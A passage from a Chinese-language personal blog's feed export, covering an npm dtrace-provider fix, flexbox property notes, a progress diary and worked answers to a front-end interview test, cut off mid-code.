SOLUTION</h1><p>由于是<code>--no-optional</code>，也不是必要的包，我就大胆删除了<br>delete this optional module   </p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">npm</span> uninstall dtrace-provider</span><br></pre></td></tr></table></figure><p>在此之后就不会有烦人的三行报错了。<br>no more error info.</p><p>鉴于还是有需要调试的场景，还是可以选择重新安装上这个模块<br>but if you need to use this module, you can reinstall it   </p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm <span class="keyword">install</span> dtrace-provider</span><br></pre></td></tr></table></figure><p>当然这是可选的。<br>of course it’s optional.  </p><hr><p>感觉自己连续学这么多天前端知识还是有用嘛。<br>以上。</p>]]></content>
      
      
      <categories>
          
          <category> Discovery </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Flex Css3</title>
      <link href="/2016/04-10-css3-Flex/"/>
      <url>/2016/04-10-css3-Flex/</url>
      
        <content type="html"><![CDATA[<p>这一篇是从css-trics抄到本人小本本上面的，现在又从小本本上腾到博客上来。<br>刚刚找原文，发现<a href="http://www.ruanyifeng.com/blog/2015/07/flex-grammar.html" target="_blank" rel="noopener">阮一峰</a>也搬运过<a href="https://css-tricks.com/snippets/css/a-guide-to-flexbox/#flexbox-background" target="_blank" rel="noopener">这一篇文章</a>。  </p><hr><h1 id="container"><a href="#container" class="headerlink" title=".container"></a>.container</h1><p>flex的容器  </p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attribute">display</span>: flex;</span><br><span class="line"><span class="attribute">flex-direction</span>: row | row-re | column | column-re;</span><br><span class="line"><span class="attribute">flex-wrap</span>: nowrap | wrap | wrap-reverse;</span><br><span class="line"><span class="attribute">flex-flow</span>: &lt;flex-direction&gt; || &lt;flex-wrap&gt;；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="lt-flex-direction-gt"><a href="#lt-flex-direction-gt" class="headerlink" title="&lt;flex-direction&gt;"></a><code>&lt;flex-direction&gt;</code></h2><p>row 行<br>row-re 逆序行<br>column 列<br>column-re 逆序列</p><h2 id="lt-flex-wrap-gt"><a href="#lt-flex-wrap-gt" class="headerlink" title="&lt;flex-wrap&gt;"></a><code>&lt;flex-wrap&gt;</code></h2><p>nowrap 禁止自动换行<br>wrap 自动换行<br>wrap-reverse 自动换行，但是第一行会在下方</p><h2 id="lt-flex-flow-gt"><a href="#lt-flex-flow-gt" class="headerlink" title="&lt;flex-flow&gt;"></a><code>&lt;flex-flow&gt;</code></h2><p>为上面两个属性的复合/速记属性。<br>规则：<code>{flex-flow: &lt;flex-direction&gt; || &lt;flex-wrap&gt;；}</code><br>例：<code>.container{flex-flow:row nowrap;}</code>  </p><h2 id="水平-lt-justify-content-gt"><a href="#水平-lt-justify-content-gt" class="headerlink" title="水平&lt;justify-content&gt;"></a><strong>水平</strong><code>&lt;justify-content&gt;</code></h2><p>flex-start 聚拢靠左<br>flex-end 聚拢靠右<br>center 聚拢居中<br>space-between （行内）内容间距相同<br>sapce-around （行内）内容左右边距相同</p><h2 id="纵向-lt-align-items-gt"><a href="#纵向-lt-align-items-gt" class="headerlink" title="纵向&lt;align-items&gt;"></a><strong>纵向</strong><code>&lt;align-items&gt;</code></h2><p>flex-start 向上对齐<br>flex-end 向下对齐<br>center 居中对齐<br>stretch 上下展开最大化<br>baseline 文字基线对齐</p><h2 id="lt-align-content-gt"><a href="#lt-align-content-gt" class="headerlink" title="&lt;align-content&gt;"></a><code>&lt;align-content&gt;</code></h2><p>flex-start 聚拢靠上<br>flex-end 聚拢靠下<br>center 聚拢居中<br>stretch 展开最大化<br>space-between （块内）内容间距相同<br>space-around （块内）内容左右边距相同</p><hr><h1 id="item"><a href="#item" class="headerlink" title=".item"></a>.item</h1><p>flex的内容  </p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attribute">order</span>: &lt;integer&gt;;</span><br><span class="line"><span class="attribute">flex-grow</span>: &lt;number&gt;;</span><br><span class="line"><span class="attribute">flex-shrink</span>: &lt;number&gt;;</span><br><span class="line"><span class="attribute">flex-basis</span>: &lt;length&gt; || auto;</span><br><span class="line"><span class="attribute">flex</span>: none || [ &lt;flex-grow&gt; &lt;flex-shrink&gt; || &lt;flex-basis&gt; ];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="lt-order-gt"><a href="#lt-order-gt" class="headerlink" title="&lt;order&gt;"></a><code>&lt;order&gt;</code></h2><p>整数型，flex的内容会由order由小到大排列。<br>例：  </p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.itemZ</span>&#123; <span class="attribute">order</span>: -<span class="number">1</span>;&#125;</span><br><span class="line"><span class="selector-class">.item0</span>&#123; <span class="attribute">order</span>: <span class="number">0</span>;&#125;</span><br><span class="line"><span class="selector-class">.item1</span>&#123; <span class="attribute">order</span>: <span class="number">1</span>;&#125; </span><br><span class="line"><span class="selector-class">.item2</span>&#123; <span class="attribute">order</span>: <span class="number">2</span>;&#125;</span><br></pre></td></tr></table></figure><p>这样就是 <code>Z-0-1-2</code> 的熟悉排列。</p><h2 id="lt-flex-grow-gt"><a href="#lt-flex-grow-gt" class="headerlink" title="&lt;flex-grow&gt;"></a><code>&lt;flex-grow&gt;</code></h2><p>数字，内容根据该数字的大小为比例放大。  </p><h2 id="lt-flex-shrink-gt"><a href="#lt-flex-shrink-gt" class="headerlink" title="&lt;flex-shrink&gt;"></a><code>&lt;flex-shrink&gt;</code></h2><p>数字，内容根据该数字的大小为比例缩小。  </p><h2 id="lt-flex-basis-gt"><a href="#lt-flex-basis-gt" class="headerlink" title="&lt;flex-basis&gt;"></a><code>&lt;flex-basis&gt;</code></h2><p>长度或<code>auto</code>，内容按该长度伸缩剩余空间。<br>可以看<a href="https://css-tricks.com/almanac/properties/f/flex-basis/" target="_blank" rel="noopener">这一篇文章</a>详细了解<code>&lt;flex-fasis&gt;</code>属性。  </p><h2 id="lt-flex-gt"><a href="#lt-flex-gt" class="headerlink" title="&lt;flex&gt;"></a><code>&lt;flex&gt;</code></h2><p>为上面三个属性<code>&lt;flex-grow&gt;</code>、<code>&lt;flex-shrink&gt;</code>、<code>&lt;flex-basis&gt;</code>的复合/速记属性。<br>规则： <code>{flex: none || [ &lt;flex-grow&gt; &lt;flex-shrink&gt; || &lt;flex-basis&gt; ];}</code><br>例：<code>.item{flex:1 1 auto;}</code>    </p><h2 id="纵向-lt-align-self-gt"><a href="#纵向-lt-align-self-gt" class="headerlink" title="纵向&lt;align-self&gt;"></a><strong>纵向</strong><code>&lt;align-self&gt;</code></h2><p>auto 与容器相同<br>flex-start 向上对齐<br>flex-end 向下对齐<br>center 居中对齐<br>stretch 上下展开最大化<br>baseline 文字基线对齐</p><hr><h1 id="源文件在这里"><a href="#源文件在这里" class="headerlink" title="源文件在这里"></a>源文件在这里</h1><p><img src="http://7xs4ih.com1.z0.glb.clouddn.com/css3flex.jpg" alt="css3flex"></p><hr><p>按照自己的理解进行的整理，如有错误还请提醒。<br>以上。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>最近在干什么04-10</title>
      <link href="/2016/04-10-whatsup2016-04-10/"/>
      <url>/2016/04-10-whatsup2016-04-10/</url>
      
        <content type="html"><![CDATA[<p><a href="http://gaoryrt.com/categories/随笔与个人文集/">本系列</a>的目的是避免自己感觉自己白活了。  </p><hr><p>截止今天，我的<a href="https://github.com/gaoryrt/" target="_blank" rel="noopener">github contribution</a>已经连续25日常绿了。<br>也就是从<em>Mar 17</em>到<em>Apr 10</em>，以清明节<em>Apr 4</em>为节点，之前在看基础前端，之后在重写本博客的主题。  </p><hr><h1 id="前端基础"><a href="#前端基础" class="headerlink" title="前端基础"></a>前端基础</h1><p>这25天的前几日都在关注前端面试题，后来发现治标不治本，不懂得东西还多，后来就决定系统学习。<br>主要渠道还是<a href="http://www.w3school.com.cn" target="_blank" rel="noopener">w3school</a>，学习了基本的html，css，css3，javascript，其间在<a href="https://www.codecademy.com" target="_blank" rel="noopener">codecademy</a>上学javascript。<br>codecademy实践性比w3school好多了，我指的是在线js编辑器，所以继续在上面学习jquery。<br>现在的工作环境还是 sublime text 3 + safari，webstorm都很少用，在线编辑器对我来说已经够用了。<br>暂时还没有发现需要 LiveStyle + chrome/firefox 的场景，感觉在将来会转到上面去，到时候又有<strong>开心的配置时光</strong>了。<br>感觉自己的编程功力越来越差了，工具带给我们很多便利，但是最好还是了解一下人家的原理。不然一直都会是脚本小子，这样的话水平随着时间慢慢下降，看似能做什么东西，其实都不是自己的。<br>学习css的时候，从网上往小本本上搬了很多css的经验，看什么时候再把小本本上的搬到个人博客上面，多抄几遍还是有用的，这是高三的经验之谈。<br>后来自己也在前辈的建议下尝试了自己造js的轮子，一个是<a href="http://gaoryrt.com/2016/03-21-shuffle/">图片的轮播图</a>，一个是<a href="http://gaoryrt.com/2016/03-23-calender/">日历组件</a>。<br>自己写出来的和github上star多的对比，完全就是渣啊，还是要多写js。  </p><hr><h1 id="重写主题"><a href="#重写主题" class="headerlink" title="重写主题"></a>重写主题</h1><p>在清明节的时候，<a href="http://itgonglun.com" target="_blank" rel="noopener">it公论</a>停播了，取而代之的是新的节目<a href="https://ipn.li/yitianshijie/" target="_blank" rel="noopener">一天世界</a>。一天世界还是由不鸟万如一先生主播，我很尊敬这样三观感染力强的人，虽然我最喜欢的是<a href="https://ipn.li/kernelpanic/" target="_blank" rel="noopener">内核恐慌</a>。<br>然后再看<a href="https://github.com/gaoryrt/dame" target="_blank" rel="noopener">dame主题</a>的时候就决定重新写了。<br>先后问了很多朋友，大家也积极给我提供意见和建议，感谢鸡哥、冲哥、小黑、翰林、奶神、奶妈、小良、姐姐还有其他暂时没有想起来名字的朋友，还有在主题建设过程中热情提供PV的各位。<br>灵感主要是来自于各个美妙的站点：<a href="https://dribbble.com" target="_blank" rel="noopener">dribbble</a>，<a href="http://flipboard.com" target="_blank" rel="noopener">Flipboard</a>，还有 <a href="http://uranusjr.com/" target="_blank" rel="noopener">uranusjr</a>，<a href="https://www.logcg.com" target="_blank" rel="noopener">logcg</a>，<a href="http://netsh.org/" target="_blank" rel="noopener">netsh</a>等个人博客。<br>字体，颜色，排版，都是大家的精华，我的内容相比之下就差了很多。  </p><hr><p>要走的路还长，慢慢来。<br>以上。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔与个人文集 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Fontend Test</title>
      <link href="/2016/04-02-aliFontendTest/"/>
      <url>/2016/04-02-aliFontendTest/</url>
      
        <content type="html"><![CDATA[<p>随便找了一份前端的测试题来做<br>想看原版的可以<a href="http://www.tuicool.com/articles/YbQB3q">点这里</a>  </p><hr><h1 id="No-1"><a href="#No-1" class="headerlink" title="No.1"></a>No.1</h1><p>这里用到了css3中的<code>display: box</code>和<code>box-flex</code><br>题目里面html结构已经规定了，对于元素的选择只能使用<code>first-child</code>,<code>nth-child()</code>了<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">            <span class="attribute">background-color</span>: darkcyan;</span><br><span class="line">            <span class="attribute">display</span>: box;</span><br><span class="line">            <span class="attribute">display</span>: -moz-box;</span><br><span class="line">            <span class="attribute">display</span>: -webkit-box;</span><br><span class="line">            <span class="attribute">height</span>: <span class="number">50px</span>;</span><br><span class="line">            <span class="attribute">line-height</span>: <span class="number">30px</span>;</span><br><span class="line">            <span class="attribute">text-indent</span>: <span class="number">10px</span>;</span><br><span class="line">            <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">            <span class="attribute">-webkit-box-flex</span>: <span class="number">1</span>;</span><br><span class="line">            <span class="attribute">-moz-box-flex</span>: <span class="number">1</span>;</span><br><span class="line">            <span class="attribute">-ms-box-flex</span>: <span class="number">1</span>;</span><br><span class="line">            <span class="attribute">box-flex</span>: <span class="number">1</span>;</span><br><span class="line">            <span class="attribute">margin</span>: <span class="number">10px</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.item</span><span class="selector-pseudo">:first-child</span> &#123;</span><br><span class="line">            <span class="attribute">-webkit-box-flex</span>: <span class="number">0</span>;</span><br><span class="line">            <span class="attribute">-moz-box-flex</span>: <span class="number">0</span>;</span><br><span class="line">            <span class="attribute">-ms-box-flex</span>: <span class="number">0</span>;</span><br><span class="line">            <span class="attribute">box-flex</span>: <span class="number">0</span>;</span><br><span class="line">            <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.item</span><span class="selector-pseudo">:nth-child(2)</span> &#123;</span><br><span class="line">            <span class="attribute">margin</span>: <span class="number">10px</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p><p>注意<code>box-flex: 1</code>的情况下，所有盒子的缩放比例都是一样的<br>所以后面还要把第一个盒子的该属性改回到0  </p><hr><h1 id="No-2"><a href="#No-2" class="headerlink" title="No.2"></a>No.2</h1><p>实现水平和垂直方向的居中<br>参考这<a href="https://www.smashingmagazine.com/2013/08/absolute-horizontal-vertical-centering-css/" target="_blank" rel="noopener">一篇文章</a>以及后续一共四篇，都是关于居中的。  </p><h2 id="绝对居中"><a href="#绝对居中" class="headerlink" title="绝对居中"></a>绝对居中</h2><p>用于父元素为<code>position: relative</code>，子元素为<code>position: absolute</code>：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.boxA</span> &#123;</span><br><span class="line">            <span class="attribute">position</span>: relative;</span><br><span class="line">            <span class="attribute">width</span>: <span class="number">500px</span>;</span><br><span class="line">            <span class="attribute">height</span>: <span class="number">500px</span>;</span><br><span class="line">            <span class="attribute">background-color</span>: green;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.boxB</span> &#123;</span><br><span class="line">            <span class="attribute">position</span>: absolute;</span><br><span class="line">            <span class="attribute">max-width</span>: <span class="number">300px</span>;</span><br><span class="line">            <span class="attribute">max-height</span>: <span class="number">300px</span>;</span><br><span class="line">            <span class="attribute">background-color</span>: blue;</span><br><span class="line">            <span class="attribute">margin</span>: auto;</span><br><span class="line">            <span class="attribute">top</span>: <span class="number">0</span>; <span class="attribute">left</span>: <span class="number">0</span>; <span class="attribute">bottom</span>: <span class="number">0</span>; <span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p><h2 id="利用transform达到负边距"><a href="#利用transform达到负边距" class="headerlink" title="利用transform达到负边距"></a>利用transform达到负边距</h2><p><strong>感觉这个最常用</strong><br>设置<code>left: 50%;top: 50%</code>之后<br>再<code>margin</code>一个负值，以达到居中的目的<br>这里由于<strong>子元素是可变</strong>的，所以可以利用transform<br>可变大小的元素也能居中：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.boxA</span> &#123;</span><br><span class="line">            <span class="attribute">position</span>: relative;</span><br><span class="line">            <span class="attribute">width</span>: <span class="number">500px</span>;</span><br><span class="line">            <span class="attribute">height</span>: <span class="number">500px</span>;</span><br><span class="line">            <span class="attribute">background-color</span>: green;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.boxB</span> &#123;</span><br><span class="line">            <span class="attribute">position</span>: absolute;</span><br><span class="line">            <span class="attribute">max-width</span>: <span class="number">300px</span>;</span><br><span class="line">            <span class="attribute">max-height</span>: <span class="number">300px</span>;</span><br><span class="line">            <span class="attribute">background-color</span>: blue;</span><br><span class="line">            <span class="attribute">margin</span>: auto;</span><br><span class="line">            <span class="attribute">top</span>: <span class="number">50%</span>;</span><br><span class="line">            <span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line">            <span class="attribute">-webkit-transform</span>: <span class="built_in">translate</span>(-50%,-50%);</span><br><span class="line">            <span class="attribute">-ms-transform</span>: <span class="built_in">translate</span>(-50%,-50%);</span><br><span class="line">            <span class="attribute">transform</span>: <span class="built_in">translate</span>(-50%,-50%);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p><h2 id="假如不是-absolute"><a href="#假如不是-absolute" class="headerlink" title="假如不是 absolute"></a>假如不是 absolute</h2><p>这里用到了<code>inline-block</code>和<code>vertical-align</code>来居中<br>伪元素<code>:after</code>相当于给这个<code>inline-block</code>一个高度<br>这个算是<strong>css hack</strong>的一部分了<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.boxA</span> &#123;</span><br><span class="line">            <span class="attribute">position</span>: relative;</span><br><span class="line">            <span class="attribute">width</span>: <span class="number">500px</span>;</span><br><span class="line">            <span class="attribute">height</span>: <span class="number">500px</span>;</span><br><span class="line">            <span class="attribute">background-color</span>: green;</span><br><span class="line">            </span><br><span class="line">            <span class="attribute">text-align</span>: center;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.boxA</span><span class="selector-pseudo">:after</span>, <span class="selector-class">.boxB</span> &#123;</span><br><span class="line">            <span class="attribute">display</span>: inline-block;</span><br><span class="line">            <span class="attribute">vertical-align</span>: middle;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.boxA</span><span class="selector-pseudo">:after</span> &#123;</span><br><span class="line">            <span class="attribute">content</span>: <span class="string">''</span>;</span><br><span class="line">            <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.boxB</span> &#123;</span><br><span class="line">            <span class="comment">/*position: absolute;*/</span></span><br><span class="line">            <span class="attribute">max-width</span>: <span class="number">300px</span>;</span><br><span class="line">            <span class="attribute">max-height</span>: <span class="number">300px</span>;</span><br><span class="line">            <span class="attribute">background-color</span>: blue;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p><hr><h1 id="No-3"><a href="#No-3" class="headerlink" title="No.3"></a>No.3</h1><h2 id="html"><a href="#html" class="headerlink" title="html"></a>html</h2><p>要求语义化，结构良好<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"shareContentPublisher"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"titleArea"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"contentTypeChooser"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">id</span>=<span class="string">"shareRadio"</span> <span class="attr">class</span>=<span class="string">"radio"</span> <span class="attr">checked</span>=<span class="string">"checked"</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"label"</span> <span class="attr">for</span>=<span class="string">"shareRadio"</span>&gt;</span>分享<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">id</span>=<span class="string">"meetingRadio"</span> <span class="attr">class</span>=<span class="string">"radio"</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"label"</span> <span class="attr">for</span>=<span class="string">"meetingRadio"</span>&gt;</span>开会<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"contentSum"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>0<span class="tag">&lt;/<span class="name">span</span>&gt;</span>/1500<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"inputArea"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">id</span>=<span class="string">"shareContentArea"</span> <span class="attr">placeholder</span>=<span class="string">"请输入你的分享, 1500字以内"</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"funcArea"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"发布"</span> <span class="attr">class</span>=<span class="string">"submit button"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>至于怎么取消<code>radio</code>的标签，<a href="http://www.zhangxinxu.com/study/201201/css-radio-tab-switch.html" target="_blank" rel="noopener">点这里</a>。<br>三角形的框，我想最好还是用背景图最好，<code>checked {background-image}</code> 这样。</p><h2 id="js"><a href="#js" class="headerlink" title="js"></a>js</h2><p>这个真不会，不忙查属性了<br>先把别人的答案放这里。<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jQuery(document).ready(<span class="function"><span class="keyword">function</span> (<span class="title">a</span>) &#123;</span></span><br><span class="line">    <span class="keyword">a</span>(<span class="string">"#message"</span>).bind(<span class="string">"focus keyup input paste"</span>, <span class="function"><span class="keyword">function</span> () &#123;</span></span><br><span class="line">        this.<span class="built_in">value</span>.<span class="built_in">length</span> &gt; <span class="number">1500</span> ? (this.<span class="built_in">value</span> = <span class="keyword">a</span>(this).attr(<span class="string">"value"</span>).<span class="keyword">text</span>(<span class="keyword">a</span>(this).attr(<span class="string">"value"</span>).<span class="built_in">length</span>))</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><hr><h1 id="No-4"><a href="#No-4" class="headerlink" title="No.4"></a>No.4</h1><p>直接执行一遍 按时间输出 0， 2， 3  </p><blockquote><p>定时器会异步的，不会阻塞，所以会先执行下一个赋值命令  </p></blockquote><p>按时间顺序是这样的：  </p><ol><li>alert(0)  </li><li>第一个开始计时  </li><li>a = 2  </li><li>第二个开始计时  </li><li>第一个时间到了  </li><li>alert(a)  </li><li>a = 3  </li><li>第二个时间到了  </li><li>alert(a)  </li><li>a = 4  </li></ol><hr><h1 id="No-5"><a href="#No-5" class="headerlink" title="No.5"></a>No.5</h1><p>这个也是查的，感觉js什么都不会呢。。。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">! <span class="function"><span class="keyword">function</span>(<span class="params">$</span>) </span>&#123;</span><br><span class="line">    <span class="comment">/* CSS TRANSITION SUPPORT (http://www.modernizr.com/)</span></span><br><span class="line"><span class="comment">     * ======================================================= */</span></span><br><span class="line">    $(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $.support.transition = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> transitionEnd = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="keyword">var</span> el = <span class="built_in">document</span>.createElement(<span class="string">'bootstrap'</span>),</span><br><span class="line">                    transEndEventNames = &#123;</span><br><span class="line">                        <span class="string">'WebkitTransition'</span>: <span class="string">'webkitTransitionEnd'</span>,</span><br><span class="line">                        <span class="string">'MozTransition'</span>: <span class="string">'transitionend'</span>,</span><br><span class="line">                        <span class="string">'OTransition'</span>: <span class="string">'oTransitionEnd otransitionend'</span>,</span><br><span class="line">                        <span class="string">'transition'</span>: <span class="string">'transitionend'</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    name;</span><br><span class="line">                <span class="keyword">for</span> (name <span class="keyword">in</span> transEndEventNames) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (el.style[name] !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">                        <span class="keyword">return</span> transEndEventNames[name];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;());</span><br><span class="line">            <span class="keyword">return</span> transitionEnd &amp;&amp; &#123;</span><br><span class="line">                end: transitionEnd</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;)();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;(<span class="built_in">window</span>.jQuery);</span><br></pre></td></tr></table></figure></p><p>检查<code>box-shadow</code>同理，也是生成一个元素时，同时生成一个<code>transition</code>属性，然后检查这个属性是否是<code>undefined</code>。从而达到检查浏览器是否支持的目的。  </p><hr><h1 id="No-6"><a href="#No-6" class="headerlink" title="No.6"></a>No.6</h1><p>当时阿里电话面就问了这个问题，我当时还什么都不懂。<br>这一题算是最简单了的吧？<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> $textareaPlaceholderText = $(<span class="string">'#textarea'</span>).attr(<span class="string">'placeholder'</span>);</span><br><span class="line">$(<span class="string">'#textarea'</span>).focus(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) 